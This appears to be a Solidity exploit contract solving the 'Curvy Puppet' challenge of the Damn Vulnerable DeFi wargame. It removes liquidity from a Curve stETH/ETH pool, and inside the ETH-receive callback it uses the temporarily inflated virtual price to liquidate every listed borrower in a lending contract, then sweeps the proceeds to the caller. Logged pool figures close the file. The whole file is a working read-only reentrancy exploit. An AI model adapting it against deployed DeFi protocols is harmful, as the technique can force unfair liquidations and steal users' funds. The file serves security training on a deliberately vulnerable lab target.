// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {console2} from "forge-std/console2.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract Attacker{
    IStableSwap curvePool;
    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    address[] users;
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    uint256 remainLps = 3e18;
    constructor(DamnValuableToken _dvt,IStableSwap _curvePool, CurvyPuppetLending _lending, address[] memory _users) {
        curvePool = _curvePool;
        lending = _lending;
        users = _users;
        dvt = _dvt;
    }

    function attack() public {
        console2.log("1.virtual price: %s", curvePool.get_virtual_price());
        uint256 totalSupply = IERC20(curvePool.lp_token()).totalSupply();
        uint256 stEthAmt = curvePool.balances(1);
        console2.log("1.stEth balance: ", stEthAmt);
        uint256 lps = IERC20(curvePool.lp_token()).balanceOf(address(this));
        uint256 removeAmt = lps * stEthAmt / totalSupply;
        console2.log("1.eth balance: ", curvePool.balances(0));
        // burn  95499847429701779504
        // curvePool.remove_liquidity_imbalance([uint(1), removeAmt], lps);
        curvePool.remove_liquidity(lps-remainLps-1,[uint(0),0]);
        payable(msg.sender).transfer(address(this).balance);
        IERC20(curvePool.lp_token()).transfer(msg.sender, IERC20(curvePool.lp_token()).balanceOf(address(this)));
        dvt.transfer(msg.sender, dvt.balanceOf(address(this)));
    }

    receive() external payable{
        console2.log("2.virtual price: %s", curvePool.get_virtual_price());
        console2.log("2.eth balance: ", curvePool.balances(0));
        uint256 lps = IERC20(curvePool.lp_token()).balanceOf(address(this));
        console2.log("2.lp balance: ", lps);
        IERC20(lending.borrowAsset()).approve(address(permit2), type(uint256).max);
        permit2.approve({
            token: lending.borrowAsset(),
            spender: address(lending),
            amount: type(uint160).max,
            expiration: uint48(block.timestamp)
        });
        for (uint i = 0; i < users.length; i++) {
            lending.liquidate(users[i]);
        }        
    }
}


// 1. 
//    lp total supply: 64083079251870435097046
//    stETH balance: 35548937793868475091973
//    eth balance: 34743277149772787006109
//    virtual price: 1096890519272757579
// burn: 188836152088071053934
// 2. lp total supply: 63894243099782364043112
//    stETH balance: 35548937793868475091973
//    eth balance: 34640897756577491950153
//    virtual price: 1098529899189269032